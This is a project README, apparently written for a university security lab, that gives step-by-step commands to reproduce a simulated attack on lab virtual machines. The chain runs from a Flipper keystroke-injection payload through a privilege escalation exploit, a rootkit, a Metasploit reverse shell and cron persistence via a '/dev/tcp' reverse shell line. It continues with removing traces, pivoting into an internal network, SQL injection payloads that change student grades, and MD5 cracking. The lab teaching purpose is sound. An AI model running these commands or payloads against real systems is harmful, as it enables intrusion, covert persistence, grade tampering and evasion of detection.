# Malware-project
This project consists in a simulation of a real case scenario attack, with cloning a card, leaving a rubber ducky (in our case a Fliper since we have one) to get a reverse shell in the target (including privilage scalation) and then a rootkit with obfuscation methods. Finally, we are going to extract files, perform lateral movement to a vulnerable php and change the marks of some students. 

Here you will find the steps about reproducing the demo, you can find more explicit details en the readme of every folder of the project.

# Steps
## Setting up
We have 3 machines: Attacker, Teacher and Bob. The machine that connects the rubber ducky will be the teacher and Bob will have the vulnerable service. Both machines will run Ubuntu 20.04, but Bob can run any version since the vulnerability does not depend on the OS version. The attacker will run the last version of Kali linux.

To sum up we will have the following IPs (that can be set up with the bash in the config folder):
- Kali: 192.168.1.30
- Teacher: 192.168.1.20 and 10.10.1.20
- Bob: 10.10.1.30

Here we have two nets, 192.168.1.0/24 simulating internet, and 10.10.1.0/24 simulating an internal network.

Now, we verify that the connections are correct:
```
config/check_network.sh
```
If every thing is correct, we can proceed.
### Attacker
We delete the john the ripper config just in case.
```
rm ~/.john/john.pot
```
We set up the server simulating an external server that we are going to download the necessary files. All files are in the attackerside folder.
```
python server_http.py 
```
Now that we have the server listening in the port 55555, in another terminal we run metasploit. We run one by one the following commands:
```
sudo service postgresql start && msfconsole -q
```
```
use multi/handler
```
```
set LHOST 192.168.1.30
```
```
set LPORT 55505
```
```
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```
```
run
```
### Bob
In Bob we will have the docker instaled (see wordpress folder for instructions if you don't have it). Then run the docker going to the wordpress folder and run:
```
./docker.sh clean && ./docker.sh build
```
Then open a browser in Teacher and go to [http://10.10.1.30:8080](http://10.10.1.30:8080) if you see the login you can close and proceed with the demo.

### Alice
Connect Fliper with the devices options of virtualbox (it should look like a keyboard)

## Running the demo
1. In teacher we run the Fliper code and we can see all the commands that run. Here is a nutshell of what it does (**remember that we have delays to see it better and because we are in a VM and that in a real case we will have it running in the background**).
	1. Opens a terminals and goes to `/tmp/gotcha`
	2. Downloads and gives permission to `./iden_match.sh` that will generate and send the logs
	3. Gets the exploit from GitHub compiles it and opens a root shell access.
	4. With root executes again `./iden_match.sh` to send the logs as root.
	5. Gets the rootkit from our server and executes it.
	6. Gets the reverse shell payload and executes it in background.
	7. Removes all the contents of the `/tmp/gotcha` folder to erase any prove that anything happened
	8. Removes the history
	9. Closes the terminal

2. In attacker, we will have the logs in the logs folder, one without root and other with root. See that the MAC address corresponds to a VM and that we check if the processor is running as a VM or BARE METAL.

3. Now, in attacker we should have a shell (meterpeter), so we run
	1. meterpeter> `sysinfo`
	2. meterpeter> `shell`
	3. `/bin/bash -i` (This should open a shell)
	4. Analyzing the rootkit: root@...:/tmp/gotcha `netstat | grep 55505` (No output since it is obfucated)
	5. Analyzing the rootkit: root@...:/tmp/gotcha `ls .. | grep gotcha` (No output since it is obfucated)

4. We add persistance of the reverse shell
   	1. root@...:/tmp/gotcha `cat /etc/cron*` We see the active cron jobs
   	2. root@...:/tmp/gotcha `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.30/55505 0>&1'" > cron` We add the cron job
   	3. root@...:/tmp/gotcha `crontab -i cron` We add the cron job (**OJO QUE EN LA DOCU PONE QUE ESTO LO ELIMINA PERO PROBAMOS**)
   	4. root@...:/tmp/gotcha `crontab -l ` we look at the commands of the crontab
   	5. It should work, but we are going only to test it at the end of the demo if there is time still available

6. Scan for intersting files:
	1. root@...:/tmp/gotcha  `wget https://urldefense.com/v3/__http://192.168.1.30:55555/download/exam_scan.sh__;!!CzQxLBnXCA!_VJuhqOvAVHMLD72XfsKZ8P7l9yynyho0R3M67Zm4RbEiQ78FBcDfvZ7YCMi5hcIUHf8ezYRkfZiA7ddRg$`
 	2. root@...:/tmp/gotcha `chmod +x exam_scan.sh`
	3. See the files in the upload folder and show one of the pdfs

7. Do `netstat -nltpu` to see that there are no services
8. Exit the shell with two exits
9. Look for other machine services
	1. meterpeter> `ifconfig` and we see that there is another interface for an internal network
	2. meterpeter> `arp` we see that there is one 10.10.1.30 (Bob)
	3. meterpeter> `run autoroute -s 10.10.1.0` to access the new discovered network
	4. meterpeter> `bg` to put the command in the background
	5. msf6> `use auxiliary/scanner/portscan/tcp` we use the portscan exploit to see vulnerable services in Bob
	6. msf6> `show options` to see the options that we have
	7. msf6> `set RHOSTS 10.10.1.30` we put the IP of Bob for analyzing the services (we do it that way because nmap is not default in ubuntu and Teacher may have not installed)
	8. msf6> `run` this may take a little bit since it scans a lot of ports
	9. We see that we have the 8080 vulnerable, typical port for an nginx
	10. msf6> `sessions 1`
	11. meterpreter> `portfwd add -l 1234 -p 8080 -r 10.10.1.30` for forwarding the local port 1234 of the attacker to the port 8080 of the Bob machine
		 
10. In the Attacker, we open a firefox and go to [http://localhost:1234](http://localhost:1234)
	1. We see a login marks site, we check if it is vulnerable by putting in the username `' OR 1=1#`
	2. Now that we know that is vulnerable we are going to explore the database. We begin with `';SHOW databases#`
	3. We see the name of the database and do `';SHOW TABLES FROM manolita#`
	4. Now that we know the table, we need to see the columns `';SHOW COLUMNS FROM manolita.users#`
	5. We are going to see the content `SELECT * FROM manolita.users#`
	6. Because we are not happy with our marks, we are going to change them: `';UPDATE manolita.users SET marks = 10 WHERE username IN ('adriansoria', 'cristianfernandez', 'albertomarmol', 'dandmarba');#`
	7. We check again with `SELECT * FROM manolita.users#` and copy a hash from one user.
11. We are going to proceed and decrypt the hash. For the length (32 characters) we know it is a MD5 hash, which is vulnerable. Nice!
    	1. TO CHECK: In a terminal use hash-identifier `hash-identifier <HASH>`
	2. Open a new terminal in attacker and `echo "<HASH>" > hash`
	3. `john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt`
